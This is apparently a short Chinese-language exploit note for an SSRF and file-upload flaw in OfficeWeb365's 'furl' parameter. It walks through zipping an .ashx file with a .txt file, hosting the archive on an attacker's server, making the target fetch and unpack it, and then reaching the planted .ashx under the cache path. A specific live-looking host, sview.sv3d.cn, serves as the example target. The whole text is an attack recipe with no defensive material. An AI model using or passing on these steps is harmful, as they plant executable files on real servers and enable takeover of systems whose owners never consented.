# OfficeWeb365 furl SSRF 文件上传漏洞

    需要提前准备 2 个文件，一个 ashx 和一个 txt 文件
 将这两个文件打包为 2.zip，然后起一个 http 服务提供给网站远程下载 然后访问?furl=http://你的公网服务器/2.zip
 随后即可发现网站对该 zip 进行了下载和解压，这里可以预览 txt 格式文件获取 zippath 参 数的值

然后 ashx 文件的地址即为:

http://x.x.x.x/cache/office/x.x.x.x.x/82308141956519700010097_486/2.ashx

```
https://sview.sv3d.cn:8443/?furl=http://xx.xx.xx.xx/2.zip
```

![image](https://s1.ax1x.com/2023/08/18/pP3p0v6.png)

![image](https://s1.ax1x.com/2023/08/18/pP3prDO.png)

https://sview.sv3d.cn:8443/cache/office/xx.xx.xx.xx.80/82308181306555000010050_833/

![image](https://s1.ax1x.com/2023/08/18/pP3p6Ve.png)
